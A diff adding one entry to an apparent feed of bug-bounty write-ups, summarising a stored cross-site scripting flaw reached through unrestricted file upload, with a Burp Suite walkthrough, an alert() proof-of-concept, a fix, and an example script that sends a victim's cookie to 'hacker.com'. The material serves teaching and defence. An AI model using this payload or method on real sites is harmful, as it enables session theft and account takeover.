@@ -41,6 +41,47 @@
     "score": 53
   },
   {
+    "id": "44ee4adc6389",
+    "title": "P2 Unrestricted File Upload Leading to Stored Cross-Site Scripting (XSS)",
+    "url": "https://medium.com/@akashmotkar001/p2-unrestricted-file-upload-leading-to-stored-cross-site-scripting-xss-f3593e691060",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "Akash motkar"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-24T11:05:14.000Z",
+    "added_at": "2026-11-25T13:37:59.302Z",
+    "categories": [
+      "file-upload",
+      "xss"
+    ],
+    "severity": "high",
+    "difficulty": "beginner",
+    "summary_en": "An unrestricted file upload vulnerability allows attackers to upload malicious HTML files containing JavaScript. When other users view these files, the script executes in their browser, potentially leading to account takeover or data theft.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The application fails to validate the content and extension of uploaded files on the server side. It relies on client-provided metadata like MIME types (labels telling the browser what a file is) and serves the files directly from the main domain. This allows an attacker to upload a .html file containing a script, which the browser then executes because the server doesn't force it to be treated as a non-executable download.",
+      "walkthrough": "RECON\n1. Navigate to a feature that accepts user-uploaded files, such as profile attachments or support tickets.\n2. Identify the specific web address (endpoint) used for the upload, such as /api/v1/files/upload.\nDISCOVERY\n3. Open Burp Suite, a tool used to intercept and modify messages (HTTP requests) between your browser and the server.\n4. Turn on the 'Intercept' feature in Burp Suite to catch the upload message before it reaches the server.\n5. Upload a harmless test file (like a small image) through the application interface.\nEXPLOITATION\n6. In Burp Suite, locate the intercepted POST request (a message sending data to the server).\n7. Find the 'filename' parameter, which is the piece of data telling the server what the file is named.\n8. Change the filename from 'test.jpg' to 'test.html' to trick the server into saving it as a webpage.\n9. Locate the 'Content-Type' header, which tells the server the category of the file.\n10. Change the value to 'text/html' so the server treats the content as a webpage.\n11. Replace the actual file data in the request with a malicious payload (the code designed to exploit the bug).\n12. Use the following payload:\n<html><body><script>alert(document.domain)</script></body></html>\nWhy: The <script> tag tells the browser to run JavaScript, and alert(document.domain) creates a popup showing the website's name to prove the script is running on the site.\n13. Click 'Forward' in Burp Suite to send the modified request to the server.\nIMPACT\n14. Review the server's response to find the location or ID of the newly uploaded file.\n15. Access the uploaded file through the application's download or preview link.\n16. Observe if the browser opens the file as a webpage and displays the 'alert' popup.\n17. Inspect the HTTP response headers (metadata sent back by the server) for the file.\n18. Check if 'Content-Type' is 'text/html', which confirms the server is telling the browser to execute the code.\n19. Check if 'Content-Disposition' is missing or not set to 'attachment', which would have forced a download instead of execution.\n20. Verify 'X-Content-Type-Options' is missing, which would have prevented the browser from guessing the file type.\n21. Log in with a second test account to see if the file is accessible to other users.\n22. Open the file link in the second account to confirm the script runs for them too, proving 'Stored XSS' (a script saved on the server that hits other users).",
+      "example": "Imagine a fictional site 'task-manager.example' where users can upload PDF resumes. A hacker creates a file named 'resume.html' containing '<script>fetch(\"https://hacker.com/steal?cookie=\" + document.cookie)</script>'. They upload this file. When a hiring manager clicks 'View Resume', the browser sees the .html extension and the 'text/html' type. Instead of showing a document, the browser runs the script, which steals the manager's login cookie (a secret key used for staying logged in) and sends it to the hacker. The hacker can now log in as the manager.",
+      "takeaway": "Always test file upload forms by changing the file extension to .html or .svg, as these can carry scripts. Look for applications that serve uploaded files on the same domain as the main app (e.g., target.com/uploads/file.html) rather than a dedicated sandbox domain (e.g., target-usercontent.com). A common mistake is only checking the file type in the browser (client-side) while ignoring it on the server. Use tools like Burp Suite to see if the server accepts 'text/html' even when it expects an image.",
+      "fix": "The server must validate file types by looking at the actual file content (magic bytes), not just the name or user-provided type. Rename all uploaded files to random strings (e.g., 'a1b2c3.txt') to prevent attackers from controlling the extension. Most importantly, serve user files with the 'Content-Disposition: attachment' header to force a download, and host them on a completely separate domain to isolate them from the main application's security context.\n\nExample fix in code:\nheader('Content-Type: application/octet-stream');\nheader('Content-Disposition: attachment; filename=\"downloaded_file.bin\"');\nheader('X-Content-Type-Options: nosniff');",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "* CWE-434 — Unrestricted Upload of File with Dangerous Type * CWE-79 — Improper Neutralization of Input During Web Page Generation * CWE-20 — Improper Input Validation **OWASP:** A05 — Injection ## 1. Description The application’s file upload functionality may permit users to upload files containing active HTML or JavaScript content without sufficient server-side validation. If uploaded files are subsequently served from a location where the browser interprets their contents as executable HTML, an attacker may be able to host a malicious payload on the application’s infrastructure. When anothe",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "d9f70827b2c2",
     "title": "I Wrote a File on a NASA Server With a 132-Byte Zip",
     "url": "https://obaskly.medium.com/i-wrote-a-file-on-a-nasa-server-with-a-132-byte-zip-41615320b5a5",
